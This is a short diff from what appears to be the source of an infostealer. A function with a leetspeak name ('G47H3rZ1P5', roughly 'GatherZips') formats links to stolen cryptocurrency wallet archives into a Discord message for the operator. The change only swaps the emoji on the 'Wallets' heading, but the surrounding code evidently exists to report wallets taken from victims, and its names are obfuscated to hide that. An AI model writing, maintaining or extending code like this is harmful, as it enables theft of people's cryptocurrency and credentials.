@@ -956,7 +956,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
 
     wal, ga, ot = "",'',''
     if not len(W411375Z1p) == 0:
-        wal = "<:bitcoin444:1224143548467777617> •  Wallets\n"
+        wal = "<:NewProject1:1224191662960410715> •  Wallets\n"
         for i in W411375Z1p:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(W411375Z1p) == 0:
